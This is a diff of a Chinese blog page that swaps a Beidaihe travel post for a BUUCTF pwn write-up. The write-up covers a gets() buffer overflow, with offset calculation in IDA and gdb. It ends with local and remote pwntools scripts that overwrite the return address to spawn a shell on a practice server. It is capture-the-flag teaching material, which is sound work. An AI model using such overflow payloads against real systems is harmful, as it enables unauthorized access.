@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="YLL">
   <meta name="keywords" content="">
-  <title>北戴河之旅 - YLL-F11</title>
+  <title>pwn之pwn1 - YLL-F11</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-10-09 15:32" pubdate>
-        2020年10月9日 下午
+      <time datetime="2020-10-21 14:58" pubdate>
+        2020年10月21日 下午
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      593 字
+      310 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      4
        分钟
     </span>
   
@@ -225,16 +225,40 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">北戴河之旅</h1>
+            <h1 style="display: none">pwn之pwn1</h1>
             
             <div class="markdown-body" id="post-body">
-              <h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>今天年的国庆节并未想好去哪？上海、三亚、威海。。。。很多地方在我脑中闪过，因为从小在内陆长大一直对大海有一直莫名的向往。但国庆又是一个很特别的期间，游客之多难以想象。再一次朋友的推荐下，我选择了北戴河。</p>
-<h3 id="行程规划"><a href="#行程规划" class="headerlink" title="行程规划"></a>行程规划</h3><p>出发地:<code>北京站</code><br>目的地:<code>北戴河站</code><br>时间:<code>2小时</code></p>
-<h3 id="酒店住宿"><a href="#酒店住宿" class="headerlink" title="酒店住宿"></a>酒店住宿</h3><p>地点:<code>南戴河金海岸</code><br>价格:<code>350左右/天</code></p>
-<h3 id="鸽子窝公园"><a href="#鸽子窝公园" class="headerlink" title="鸽子窝公园"></a>鸽子窝公园</h3><p>网上说，鸽子屋的日出是很美的。但我早上并没有起来，就在酒店看了看日出，海上的日出确实让我眼前一亮，很美。收拾完后，到了鸽子屋大概10点左右，相对其他地方的景点来说，人数应该算是一吧。门票价25元一位，价格很亲民。我和女朋友一起去的，沙滩上一边走一边看海鸽子，偶而不远的地方还有一片小礁石，很多大人带着小孩在那里抓螃蟹、皮皮虾、贝壳。</p>
-<h3 id="刘庄夜市"><a href="#刘庄夜市" class="headerlink" title="刘庄夜市"></a>刘庄夜市</h3><p>刘庄夜市距离鸽子屋坐公交车只有2站的距离，不是很远。这里主要是个小吃的地方，东西的感觉较贵一些，味道整体给4颗星吧，还行。不过这里的建筑分格很有特色，繁华中不失唯美。</p>
-<h3 id="碧螺岛"><a href="#碧螺岛" class="headerlink" title="碧螺岛"></a>碧螺岛</h3><p>碧螺岛位于黄金海岸对面，距离酒店很近。但需要乘坐缆车过去，票价是95，还包括一个海上游船票，我个人觉的游船不太好玩。但是缆车还是相当不错的，坐在缆车上，在高空眺望大海。。。。。</p>
-<h3 id="南戴河金海岸"><a href="#南戴河金海岸" class="headerlink" title="南戴河金海岸"></a>南戴河金海岸</h3><p>大概下午5点中左右，延着黄金海岸一直往南走去，不远处你会发现一个渔民出海归来的地方。此时正是渔民打鱼归来，夕阳照射下的渔船是那么的唯美，接着一框一筐的海鲜被搬上岸来，有螃蟹、海星、拳头大的海螺等等。。。。由于我正好10月份去，刚好赶上梭子蟹正肥的时候。从渔民手里购买会比市场便宜很多而且又新鲜，如果你砍价的能力强的话，200多可以买很多东西。</p>
+              <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>BUUCTF <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">地址</a></p>
+<h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>F5 查看伪代码，gets存在溢出漏洞，并且存在system函数。所以只需要计算出偏移量，溢出跳转至system函数。<br><img src="/images/pwn1/1.png" srcset="/img/loading.gif"> </p>
+<p>system函数地址<code>0x000000000040118A</code>。<br><img src="/images/pwn1/3.png" srcset="/img/loading.gif"> </p>
+<h3 id="手动偏移量计算"><a href="#手动偏移量计算" class="headerlink" title="手动偏移量计算"></a>手动偏移量计算</h3><p>ida逆向寻找到gets的地址，并在gdb中下断点。<br><img src="/images/pwn1/2.png" srcset="/img/loading.gif"> </p>
+<p>输入<code>r</code>运行，计算ESP 到 EBP的偏移量<code>0x7fffffffdde0-(0x7fffffffdde0+1h)+8=23</code>，因为一个指针在64位操作系统上，占8个字节，所以要加8。详细计算方式可参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/03/03/ROP%E4%B9%8Bret2text/">如下链接</a></p>
+<p><img src="/images/pwn1/4.png" srcset="/img/loading.gif"> </p>
+<p>输入<code>c</code>继续运行，EAX与ESP的偏移量确实为<code>1h</code>，而ida静态分析中发现ESP到EAX的偏移量<code>1h</code>是正确的，ESP到EBP为<code>F (15)</code>错误的</p>
+<p><img src="/images/pwn1/5.png" srcset="/img/loading.gif"> </p>
+<h3 id="GDB-pattern计算偏移量"><a href="#GDB-pattern计算偏移量" class="headerlink" title="GDB pattern计算偏移量"></a>GDB pattern计算偏移量</h3><pre><figcaption><span>50```随机生成50个字符，输入运行。根据报错地址内容```0x3b41414441412841```计算偏移量。</span></figcaption><code class="hljs pattern_create">![](&#x2F;images&#x2F;pwn1&#x2F;6.png) 
+
+&#96;&#96;&#96;pattern_offest 0x3b41414441412841&#96;&#96;&#96;计算出偏移量为23。
+![](&#x2F;images&#x2F;pwn1&#x2F;7.png) 
+
+### poc
+
+* 本地poc
+&#96;&#96;&#96;aidl
+from pwn import *
+
+sh &#x3D; process(&quot;.&#x2F;pwn1&quot;)
+binsh_addr &#x3D; 0x000000000040118A
+payload &#x3D; &#39;&#39;
+payload +&#x3D; &#39;A&#39;*23
+payload +&#x3D; p64(binsh_addr)
+sh.sendline(payload)
+sh.interactive()</code></pre>
+
+<ul>
+<li>远程poc<br>&lt;!–hexoPostRenderEscape:<pre><code class="hljs aidl">from pwn import *</li>
+</ul>
+<p>sh &#x3D; remote(&#39;node3.buuoj.cn&#39;,26142)<br>binsh_addr &#x3D; 0x000000000040118A<br>payload &#x3D; &#39;&#39;<br>payload +&#x3D; &#39;A&#39;*23<br>payload +&#x3D; p64(binsh_addr)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre>:hexoPostRenderEscape–&gt;</p>
 
             </div>
             <hr>
@@ -245,7 +269,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
                     
                   </div>
                 
@@ -258,18 +282,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/10/21/pwn%E4%B9%8Bpwn1/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pwn之pwn1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/">
-                        <span class="hidden-mobile">简单的Telegram机器人</span>
+                      <a href="/2020/10/09/%E5%8C%97%E6%88%B4%E6%B2%B3%E4%B9%8B%E6%97%85/">
+                        <span class="hidden-mobile">北戴河之旅</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -447,7 +465,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "北戴河之旅&nbsp;",
+        "pwn之pwn1&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
